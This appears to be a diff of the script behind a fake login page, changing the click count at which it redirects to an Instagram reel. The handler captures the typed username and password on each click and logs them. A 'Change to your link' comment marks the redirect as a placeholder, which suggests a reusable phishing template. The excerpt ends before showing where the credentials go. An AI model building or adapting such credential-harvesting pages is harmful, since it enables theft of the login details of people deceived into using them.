@@ -11,12 +11,12 @@ var clickCount = 0;
 loginbtn.addEventListener("click",async function() {
   
   clickCount++;
-  if (clickCount >= 5) {
+  if (clickCount >= 4) {
     window.location.href = 'https://www.instagram.com/reel/DGGEVYsspb_/?igsh=MWNpbTJicDk3cXZ3aQ=='; // Change to your link
   }
    console.log("done");
 
-   if(clickCount<5){
+   if(clickCount<4){
    const username = await userbtn.value;
    const password = await passbtn.value;
       console.log(username + " : " + password)
